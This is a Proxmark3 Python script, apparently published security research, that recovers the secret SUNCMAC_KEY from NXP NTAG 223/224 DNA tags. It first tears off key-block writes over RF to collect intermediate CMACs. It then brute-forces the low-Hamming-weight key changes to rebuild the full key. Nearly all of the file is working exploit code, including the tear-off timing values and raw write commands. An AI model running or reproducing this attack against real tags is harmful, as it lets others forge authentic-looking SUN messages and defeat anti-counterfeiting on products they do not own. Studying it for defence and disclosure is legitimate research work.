#!/usr/bin/env python3

# Recover the mask and SUNCMAC_KEY used in NTAG 22x DNA SUNCMAC.
#
# Conditions:
# * NTAG 223/224 DNA with SUNCMAC enabled
# * SUNCMAC_KEY blocks not locked by LOCK_SUNCMAC_KEY
#
# Current limitations:
# * NTAG 224 not tested
# * non-SD versions not tested
# * Counter and TT must be disabled
# * AUTH0 needs to allow unauthenticated writes to key blocks
#
# doegox & noproto, 2025
# cf "BREAKMEIFYOUCAN!: Exploiting Keyspace Reduction and Relay Attacks in 3DES and AES-protected NFC Technologies"
# for more info

import sys
import argparse
import time
from itertools import combinations
import json

total_auth = 0
debug = False


def console_debug(p, command, capture=True, debug=False):
    """Print debug messages to the console if debugging is enabled."""
    if debug:
        print(command)
        sys.stdout.flush()
    p.console(command, capture=capture)


def hamming_weight(n):
    """Compute the Hamming weight (number of set bits) of an integer."""
    return bin(n).count('1')


def hamming_distance(n, m):
    """Compute the Hamming distance between two integers."""
    return bin(n ^ m).count('1')


def enumerate_words_with_k_bits_set(n_bits, max_bits_set, mask=0):
    """Generate all n-bit words with up to max_bits_set bits set, respecting a mask."""
    non_masked_positions = [pos for pos in range(n_bits) if not (mask & (1 << pos))]
    yield 0
    for k in range(1, max_bits_set + 1):
        # print(f"Enumerating words with {k} bits set: {len(list(combinations(non_masked_positions, k)))}")
        for bits in combinations(non_masked_positions, k):
            value = 0
            for pos in bits:
                value |= (1 << pos)
            yield value


def insert_key(keys, newkey, initkey):
    """Insert a new key into the list of keys, ensuring no duplicates."""
    if newkey not in keys:
        keys.insert(0, newkey)
        keys.sort(key=lambda k: hamming_distance(k, initkey), reverse=True)
    bigflip = 0
    for key in keys:
        bigflip |= key ^ initkey
    bigkey = initkey ^ bigflip
    if bigkey not in keys:
        keys.insert(0, bigkey)
    return keys


def get_version(p):
    """Get the version of the NTAG.

    Return: (223 or 224, isSD boolean)"""
    console_debug(p, 'hf 14a raw -sc 60', debug=debug)
    for line in p.grabbed_output.split('\n'):
        parts = line.split(']')
        if len(parts) == 3:
            version = bytes.fromhex(''.join(parts[1].split('[')[0].strip().split()))
            assert version[:3] == b'\x00\x04\x04', "Not a NTAG: unexpected version bytes"
            assert version[3] in (2, 8), "Not a NTAG: unexpected product subtype byte"
            if version[4:] == b'\x04\x00\x0F\x03':
                return 223, version[3] == 8
            if version[4:] == b'\x05\x00\x10\x03':
                return 224, version[3] == 8
            raise ValueError("NTAG but not 223/224: unexpected version bytes")
    raise ValueError("Not a NTAG: cannot get version")


def read_block(p, block):
    """Read block."""
    console_debug(p, f'hf 14a raw -sc 30{block:02x}', debug=debug)
    for line in p.grabbed_output.split('\n'):
        parts = line.split(']')
        if len(parts) == 3:
            return bytes.fromhex(''.join(parts[1].split('[')[0].strip().split()))[:4]
    return None


def read_msg(p, mirror_page, mirror_byte, issd):
    """Read SUN msg with CMAC."""
    start_block = mirror_page
    stop_block = (mirror_page * 4 + mirror_byte + (49 if issd else 38)) // 4
    console_debug(p, f'hf 14a raw -sc 3a{start_block:02x}{stop_block:02x}', debug=debug)
    for line in p.grabbed_output.split('\n'):
        parts = line.split(']')
        if len(parts) == 3:
            raw = bytes.fromhex(''.join(parts[1].split('[')[0].strip().split()))
            raw = raw[mirror_byte:]
            raw = raw[:49 if issd else 38]
            return raw.decode()
    return None


def read_mac(p, mirror_page, mirror_byte, issd):
    """Read CMAC."""
    start_block = (mirror_page * 4 + mirror_byte + (33 if issd else 22)) // 4
    stop_block = (mirror_page * 4 + mirror_byte + (49 if issd else 38)) // 4
    console_debug(p, f'hf 14a raw -sc 3a{start_block:02x}{stop_block:02x}', debug=debug)
    for line in p.grabbed_output.split('\n'):
        parts = line.split(']')
        if len(parts) == 3:
            raw = bytes.fromhex(''.join(parts[1].split('[')[0].strip().split()))
            raw = raw[(mirror_byte + (33 if issd else 22)) % 4:]
            raw = raw[:16]
            return raw.decode()
    return None


def tear(p, block, tear3):
    console_debug(p, f'hw tearoff --delay {tear3}', capture=False, debug=debug)
    console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
    console_debug(p, f'hf 14a raw -sc a2{block:02x}00000000', capture=False, debug=debug)


def tears(p, block, init_mac, tear1, tear2, tear3, mirror_page, mirror_byte, issd, end_mac=None, quiet=False):
    macs = [init_mac]
    ntears = 0
    if not quiet:
        print(".", end='', flush=True)
    console_debug(p, f'hw tearoff --delay {tear1}', capture=False, debug=debug)
    console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
    ntears += 1
    console_debug(p, f'hf 14a raw -sc a2{block:02x}00000000', capture=False, debug=debug)
    console_debug(p, f'hw tearoff --delay {tear2}', capture=False, debug=debug)
    same_mac = 0
    while True:
        mac = read_mac(p, mirror_page, mirror_byte, issd)
        if mac is not None and mac != macs[-1]:
            macs.append(mac)
            if not quiet:
                print(".", end='', flush=True)
            same_mac = 0
            if end_mac is not None and mac == end_mac:
                break
        else:
            same_mac += 1
            if end_mac is None and same_mac > 10 and len(macs) > 1:
                break
        console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
        ntears += 1
        console_debug(p, f'hf 14a raw -sc a2{block:02x}00000000', capture=False, debug=debug)
    console_debug(p, f'hw tearoff --delay {tear3}', capture=False, debug=debug)
    console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
    ntears += 1
    console_debug(p, f'hf 14a raw -sc a2{block:02x}00000000', capture=False, debug=debug)
    mac = read_mac(p, mirror_page, mirror_byte, issd)
    if mac is not None and mac != macs[-1]:
        macs.append(mac)
    return macs, ntears


def main():
    """
    Recover SUNCMAC_KEY and mask used in NTAG 223 & 224 DNA cards.

    This script collects the necessary SUN messages either with a Proxmark3 device or from a file, and attempts
    to crack the SUNCMAC_KEY using the collected messages, with the help of the ntag22x_libsuncmac library.

    Conditions:
    * NTAG 223/224 DNA with SUNCMAC enabled
    * SUNCMAC_KEY blocks not locked by LOCK_SUNCMAC_KEY

    Current limitations:
    * NTAG 224 not tested
    * non-SD versions not tested
    * Counter and TT must be disabled
    * AUTH0 needs to allow unauthenticated writes to key blocks

    Attention points:
    * If the brute-force is interrupted before completion, the card key will be left erased!
    * If saving messages to a file for offline processing, the card key will also be erased,
      but you will be able to restore it once found.

    Examples:

    - Demo the attack by first formatting the card as NDEF with SUNCMAC and configuring the BREAKME key:
          $ pm3 -y 'ntag22x_suncmac_recovery --format --initkey 0x2b7e151628aed2a6abf7158809cf4f3c'
      or, from the client:
          pm3 --> script run ntag22x_suncmac_recovery --format --initkey 0x2b7e151628aed2a6abf7158809cf4f3c

    - Collect SUN messages and save them in a file for later offline processing:
          $ pm3 -y 'ntag22x_suncmac_recovery --step1 --json mac_data.json'
      or, from the client:
          pm3 --> script run ntag22x_suncmac_recovery --step1 --json mac_data.json

    - Recover key and mask from previously collected messages (doesn't require the Proxmark3 client):
          $ python3 ntag22x_suncmac_recovery --step2 --json mac_data.json
      or, nevertheless from the client:
          pm3 --> script run ntag22x_suncmac_recovery --step2 --json mac_data.json
    """
    parser = argparse.ArgumentParser(
        description=main.__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('--format', action='store_true', help='Format tag as NDEF with SUNCMAC activated')
    parser.add_argument('--initkey', type=lambda x: int(x, 0), default=None, help='Initial key (hex), for testing purposes')
    parser.add_argument('--tear1', type=int, default=280, help='Initial tearoff value (us)')
    parser.add_argument('--tear2', type=int, default=245, help='Progressive tearoff value (us)')
    parser.add_argument('--tear3', type=int, default=500, help='Full erase tearoff value (us)')
    parser.add_argument('--step1', action='store_true', help='Step1: collect MACs from the tag')
    parser.add_argument('--step2', action='store_true', help='Step2: crack collected MACs in JSON file')
    parser.add_argument('--bitflips', type=int, default=8, help='Step2 max Hamming Distance to test. Default: 8')
    parser.add_argument('--json', type=str, help='JSON file to save/load MAC data')
    parser.add_argument('--debug', action='store_true', help='Enable debug output')
    args = parser.parse_args()

    format_tag = args.format
    init_key = args.initkey
    tear1 = args.tear1
    tear2 = args.tear2
    tear3 = args.tear3
    step1 = args.step1
    step2 = args.step2
    bitflips = args.bitflips
    jsonfile = args.json
    global debug
    debug = args.debug
    mac_data = {}
    step1_time = None
    step2_time = None
    ntears_tot = 0
    if not (step1 or step2):
        step1 = True
        step2 = True
    if (step1 ^ step2) and jsonfile is None:
        print("Error: --json argument is required in single step mode")
        sys.exit(1)
    # Import later because it requires cryptography module, which can be imported only once in the session
    from ntag22x_libsuncmac import verify_suncmac, bruteforce_suncmac_low_hw
    key_blocks = None
    cfg_blocks = None
    key_cfg_block = None
    dict_key_blocks = {223: [52, 53, 54, 55], 224: [68, 69, 70, 71]}
    dict_cfg_blocks = {223: [41, 42], 224: [57, 58]}
    dict_key_cfg_block = {223: 45, 224: 61}
    if not step1:
        with open(jsonfile, "r") as json_file:
            mac_data = json.load(json_file)
            print("Collected MACs:")

            def show_tears1(key):
                value = mac_data[key]
                key = key.replace("mac_", "")
                print(f"* {key.replace('z', 'Z').replace('u', 'U')} to "
                      f"{key.replace('z', 'M').replace('u', 'M')}: {'.'*len(value)}")

            show_tears1("mac_uUUU")
            show_tears1("mac_MuUU")
            show_tears1("mac_MMuU")
            show_tears1("mac_MMMu")
            show_tears1("mac_zZZZ")
            show_tears1("mac_MzZZ")
            show_tears1("mac_MMzZ")
            show_tears1("mac_MMMz")

    else:
        import pm3
        p = pm3.pm3()
        version, issd = get_version(p)
        print(f"Detected NTAG {version} DNA {'StatusDetect' if issd else ''}")
        key_blocks = dict_key_blocks[version]
        cfg_blocks = dict_cfg_blocks[version]
        key_cfg_block = dict_key_cfg_block[version]
        # segment = 3 - ((block - 48) % 4)

        console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
        # Check key is writable
        key_cfg = read_block(p, key_cfg_block)
        assert key_cfg is not None and key_cfg[0] & 0x80 == 0

        if format_tag:
            # Preparing NDEF http://www.foo.bar?uid=
            console_debug(p, 'hf 14a raw -skc a2040342d101', capture=False, debug=debug)
            console_debug(p, 'hf 14a raw -kc a2053e550166', capture=False, debug=debug)
            console_debug(p, 'hf 14a raw -kc a2066F6F2E62', capture=False, debug=debug)
            console_debug(p, 'hf 14a raw -kc a20761723F75', capture=False, debug=debug)
            console_debug(p, 'hf 14a raw -kc a20869643D00', capture=False, debug=debug)
            # CFG_0: CFG_B0=MIRROR_EN|MIRROR_BYTE=3 TT MIRROR_PAGE=8 AUTH0
            console_debug(p, f'hf 14a raw -kc a2{cfg_blocks[0]:02x}983D083C', capture=False, debug=debug)
            # CFG_1: CFG_B1=PROT
            console_debug(p, f'hf 14a raw -c a2{cfg_blocks[1]:02x}80000000', capture=False, debug=debug)

        # Get dynamic msg offset
        cfg_block0 = read_block(p, cfg_blocks[0])
        assert cfg_block0 is not None
        cfg_block1 = read_block(p, cfg_blocks[1])
        assert cfg_block1 is not None
        mirror_page = cfg_block0[2]
        mirror_byte = (cfg_block0[0] >> 3) & 0x03
        if format_tag:
            assert mirror_page == 0x08 and mirror_byte == 0x03, "Unexpected MIRROR_PAGE or MIRROR_BYTE after formatting"

        if init_key is not None:
            mem_key = init_key.to_bytes(16, 'big')[::-1]
            data = int.from_bytes(mem_key[0:4], 'big')
            console_debug(p, f'hf 14a raw -skc a2{key_blocks[0]:02x}{data:08x}', capture=False, debug=debug)
            data = int.from_bytes(mem_key[4:8], 'big')
            console_debug(p, f'hf 14a raw -kc a2{key_blocks[1]:02x}{data:08x}', capture=False, debug=debug)
            data = int.from_bytes(mem_key[8:12], 'big')
            console_debug(p, f'hf 14a raw -kc a2{key_blocks[2]:02x}{data:08x}', capture=False, debug=debug)
            data = int.from_bytes(mem_key[12:16], 'big')
            console_debug(p, f'hf 14a raw -c a2{key_blocks[3]:02x}{data:08x}', capture=False, debug=debug)
            key = init_key.to_bytes(16, 'big').hex()
            msg = read_msg(p, mirror_page, mirror_byte, issd)
            assert msg is not None
            assert verify_suncmac(key, msg)

        console_debug(p, 'hf mfu ndefread', debug=debug)
        for line in p.grabbed_output.split('\n'):
            if 'uri... ' in line:
                print("NDEF:", line.split('uri... ')[1])

        step1_start_time = time.time()
        print(f"Detected MIRROR_PAGE={mirror_page}, MIRROR_BYTE={mirror_byte}")
        msg1 = read_msg(p, mirror_page, mirror_byte, issd)
        assert msg1 is not None
        print(f"Reading message: >>{msg1}<<")
        msg2 = read_msg(p, mirror_page, mirror_byte, issd)
        assert msg2 is not None
        # Check no counter or TT is active
        assert msg1 == msg2
        mac_UUUU = read_mac(p, mirror_page, mirror_byte, issd)
        assert mac_UUUU is not None
        print(f"Reading CMAC: >>{mac_UUUU}<<")
        assert msg1[-16:] == mac_UUUU
        msg = msg1[:-16]

        print("\nTearing progressively from UUUU to MMMM:", end='')
        print("\n* UUUU to MUUU: ", end='')
        mac_uUUU, ntears = tears(p, key_blocks[0], mac_UUUU, tear1, tear2, tear3,
                                 mirror_page, mirror_byte, issd)
        ntears_tot += ntears
        print("\n* MUUU to MMUU: ", end='')
        mac_MuUU, ntears = tears(p, key_blocks[1], mac_uUUU[-1], tear1, tear2, tear3,
                                 mirror_page, mirror_byte, issd)
        ntears_tot += ntears
        print("\n* MMUU to MMMU: ", end='')
        mac_MMuU, ntears = tears(p, key_blocks[2], mac_MuUU[-1], tear1, tear2, tear3,
                                 mirror_page, mirror_byte, issd)
        ntears_tot += ntears
        print("\n* MMMU to MMMM: ", end='')
        mac_MMMu, ntears = tears(p, key_blocks[3], mac_MMuU[-1], tear1, tear2, tear3,
                                 mirror_page, mirror_byte, issd)
        ntears_tot += ntears
        mac_MMMM = mac_MMMu[-1]
        console_debug(p, f'hf 14a raw -sc a2{key_blocks[3]:02x}00000000', capture=False, debug=debug)
        mac_MMMZ = read_mac(p, mirror_page, mirror_byte, issd)
        console_debug(p, f'hf 14a raw -sc a2{key_blocks[2]:02x}00000000', capture=False, debug=debug)
        mac_MMZZ = read_mac(p, mirror_page, mirror_byte, issd)
        console_debug(p, f'hf 14a raw -sc a2{key_blocks[1]:02x}00000000', capture=False, debug=debug)
        mac_MZZZ = read_mac(p, mirror_page, mirror_byte, issd)
        console_debug(p, f'hf 14a raw -sc a2{key_blocks[0]:02x}00000000', capture=False, debug=debug)
        mac_ZZZZ = read_mac(p, mirror_page, mirror_byte, issd)
        print("\nTearing progressively from ZZZZ to MMMM:", end='')
        print("\n* ZZZZ to MZZZ: ", end='')
        mac_zZZZ, ntears = tears(p, key_blocks[0], mac_ZZZZ, tear1, tear2, tear3,
                                 mirror_page, mirror_byte, issd, mac_MZZZ)
        ntears_tot += ntears
        print("\n* MZZZ to MMZZ: ", end='')
        mac_MzZZ, ntears = tears(p, key_blocks[1], mac_MZZZ, tear1, tear2, tear3,
                                 mirror_page, mirror_byte, issd, mac_MMZZ)
        ntears_tot += ntears
        print("\n* MMZZ to MMMZ: ", end='')
        mac_MMzZ, ntears = tears(p, key_blocks[2], mac_MMZZ, tear1, tear2, tear3,
                                 mirror_page, mirror_byte, issd, mac_MMMZ)
        ntears_tot += ntears
        print("\n* MMMZ to MMMM: ", end='')
        mac_MMMz, ntears = tears(p, key_blocks[3], mac_MMMZ, tear1, tear2, tear3,
                                 mirror_page, mirror_byte, issd, mac_MMMM)
        ntears_tot += ntears
        print("\n")

        # set SUNCMAC_KEY to zero, just to avoid misconfigurations
        console_debug(p, f'hf 14a raw -sc a2{key_blocks[0]:02x}00000000', capture=False, debug=debug)
        console_debug(p, f'hf 14a raw -sc a2{key_blocks[1]:02x}00000000', capture=False, debug=debug)
        console_debug(p, f'hf 14a raw -sc a2{key_blocks[2]:02x}00000000', capture=False, debug=debug)
        console_debug(p, f'hf 14a raw -sc a2{key_blocks[3]:02x}00000000', capture=False, debug=debug)

        # Save the MACs in a JSON file
        mac_data = {
            "msg": msg,
            "mac_zZZZ": mac_zZZZ,
            "mac_MzZZ": mac_MzZZ,
            "mac_MMzZ": mac_MMzZ,
            "mac_MMMz": mac_MMMz,
            "mac_MMMu": mac_MMMu,
            "mac_MMuU": mac_MMuU,
            "mac_MuUU": mac_MuUU,
            "mac_uUUU": mac_uUUU,
        }

        if jsonfile:
            with open(jsonfile, "w") as json_file:
                json.dump(mac_data, json_file, indent=4)
                print(f"[+] Challenges saved to {args.json}.")
                print("[!] Beware that the card SUNCMAC_KEY is now erased!")
        step1_time = time.time() - step1_start_time

    if step2:
        step2_start_time = time.time()
        key = 0
        assert verify_suncmac(key, mac_data["msg"] + mac_data["mac_zZZZ"][0])
        ncmac_tot = 1

        def show_tears2(key, reverse=False):
            key = key.replace("mac_", "")
            if reverse:
                print(f"* {key.replace('z', 'M').replace('u', 'M')} to "
                      f"{key.replace('z', 'Z').replace('u', 'U')}:")
            else:
                print(f"* {key.replace('z', 'Z').replace('u', 'U')} to "
                      f"{key.replace('z', 'M').replace('u', 'M')}:")

        print("\nCracking mask progressively from ZZZZ to MMMM:")
        show_tears2("mac_zZZZ")
        for mac in mac_data["mac_zZZZ"]:
            newkey, ncmac = bruteforce_suncmac_low_hw(key, mac_data["msg"] + mac, 3, bitflips=bitflips, quiet=True)
            ncmac_tot += ncmac
            assert newkey is not None
            print(f"  * {newkey:032X} at HD={hamming_distance(newkey, key)}, tried {ncmac:8} candidates")
            key |= newkey
        show_tears2("mac_MzZZ")
        for mac in mac_data["mac_MzZZ"]:
            newkey, ncmac = bruteforce_suncmac_low_hw(key, mac_data["msg"] + mac, 2, bitflips=bitflips, quiet=True)
            ncmac_tot += ncmac
            assert newkey is not None
            print(f"  * {newkey:032X} at HD={hamming_distance(newkey, key)}, tried {ncmac:8} candidates")
            key |= newkey
        show_tears2("mac_MMzZ")
        for mac in mac_data["mac_MMzZ"]:
            newkey, ncmac = bruteforce_suncmac_low_hw(key, mac_data["msg"] + mac, 1, bitflips=bitflips, quiet=True)
            ncmac_tot += ncmac
            assert newkey is not None
            print(f"  * {newkey:032X} at HD={hamming_distance(newkey, key)}, tried {ncmac:8} candidates")
            key |= newkey
        show_tears2("mac_MMMz")
        for mac in mac_data["mac_MMMz"]:
            newkey, ncmac = bruteforce_suncmac_low_hw(key, mac_data["msg"] + mac, 0, bitflips=bitflips, quiet=True)
            ncmac_tot += ncmac
            assert newkey is not None
            print(f"  * {newkey:032X} at HD={hamming_distance(newkey, key)}, tried {ncmac:8} candidates")
            key |= newkey
        mask_key = key
        print("\nCracking CMACs progressively from MMMM to UUUU:")
        flips = 0
        show_tears2("mac_MMMu", reverse=True)
        for mac in mac_data["mac_MMMu"][::-1]:
            newkey, ncmac = bruteforce_suncmac_low_hw(key, mac_data["msg"] + mac, 0, bitflips=bitflips, quiet=True)
            ncmac_tot += ncmac
            assert newkey is not None
            print(f"  * {newkey:032X} at HD={hamming_distance(newkey, key)}, tried {ncmac:8} candidates")
            flips |= newkey ^ key
            key = mask_key ^ flips
        show_tears2("mac_MMuU", reverse=True)
        for mac in mac_data["mac_MMuU"][::-1]:
            newkey, ncmac = bruteforce_suncmac_low_hw(key, mac_data["msg"] + mac, 1, bitflips=bitflips, quiet=True)
            ncmac_tot += ncmac
            assert newkey is not None
            print(f"  * {newkey:032X} at HD={hamming_distance(newkey, key)}, tried {ncmac:8} candidates")
            flips |= newkey ^ key
            key = mask_key ^ flips
        show_tears2("mac_MuUU", reverse=True)
        for mac in mac_data["mac_MuUU"][::-1]:
            newkey, ncmac = bruteforce_suncmac_low_hw(key, mac_data["msg"] + mac, 2, bitflips=bitflips, quiet=True)
            ncmac_tot += ncmac
            assert newkey is not None
            print(f"  * {newkey:032X} at HD={hamming_distance(newkey, key)}, tried {ncmac:8} candidates")
            flips |= newkey ^ key
            key = mask_key ^ flips
        show_tears2("mac_uUUU", reverse=True)
        for mac in mac_data["mac_uUUU"][::-1]:
            newkey, ncmac = bruteforce_suncmac_low_hw(key, mac_data["msg"] + mac, 3, bitflips=bitflips, quiet=True)
            ncmac_tot += ncmac
            assert newkey is not None
            print(f"  * {newkey:032X} at HD={hamming_distance(newkey, key)}, tried {ncmac:8} candidates")
            flips |= newkey ^ key
            key = mask_key ^ flips
            assert key is not None
        print(f"\nMask key found:\n    {mask_key:032X}")
        print(f"\nSUNCMAC_KEY found:\n    {key:032X}")
        # Restore the key on the card
        mem_key = key.to_bytes(16, 'big')[::-1]
        data0 = int.from_bytes(mem_key[0:4], 'big')
        data1 = int.from_bytes(mem_key[4:8], 'big')
        data2 = int.from_bytes(mem_key[8:12], 'big')
        data3 = int.from_bytes(mem_key[12:16], 'big')
        if step1 and key_blocks is not None:
            console_debug(p, f'hf 14a raw -skc a2{key_blocks[0]:02x}{data0:08x}', capture=False, debug=debug)
            console_debug(p, f'hf 14a raw -kc a2{key_blocks[1]:02x}{data1:08x}', capture=False, debug=debug)
            console_debug(p, f'hf 14a raw -kc a2{key_blocks[2]:02x}{data2:08x}', capture=False, debug=debug)
            console_debug(p, f'hf 14a raw -c a2{key_blocks[3]:02x}{data3:08x}', capture=False, debug=debug)
            print("\nSUNCMAC_KEY restored on the card")
        else:
            print("\nYou can restore the found key on the card with")
            print("\nFor a NTAG 223 DNA:")
            print(f'hf 14a raw -skc a2{dict_key_blocks[223][0]:02x}{data0:08x}')
            print(f'hf 14a raw -kc a2{dict_key_blocks[223][1]:02x}{data1:08x}')
            print(f'hf 14a raw -kc a2{dict_key_blocks[223][2]:02x}{data2:08x}')
            print(f'hf 14a raw -c a2{dict_key_blocks[223][3]:02x}{data3:08x}')
            print("\nFor a NTAG 224 DNA:")
            print(f'hf 14a raw -skc a2{dict_key_blocks[224][0]:02x}{data0:08x}')
            print(f'hf 14a raw -kc a2{dict_key_blocks[224][1]:02x}{data1:08x}')
            print(f'hf 14a raw -kc a2{dict_key_blocks[224][2]:02x}{data2:08x}')
            print(f'hf 14a raw -c a2{dict_key_blocks[224][3]:02x}{data3:08x}')

        step2_time = time.time() - step2_start_time

    if step1_time is not None:
        print(f"\nStep 1 time: {step1_time:3.2f} seconds")
    if step2_time is not None:
        print(f"\nStep 2 time: {step2_time:3.2f} seconds")
    if step1_time is not None and step2_time is not None:
        print(f"\nTotal time:  {step1_time + step2_time:3.2f} seconds")

    if ntears_tot > 0:
        print(f"\nTotal tears: {ntears_tot:8} operations")
    mac_tot = 0
    for key, value in mac_data.items():
        if "mac_" in key:
            mac_tot += len(value)
    if step2:
        print(f"\nTotal CMAC:  {ncmac_tot:8} operations against {mac_tot:8} MACs")
    else:
        print(f"\nTotal MACs collected: {mac_tot:8}")


if __name__ == "__main__":
    main()
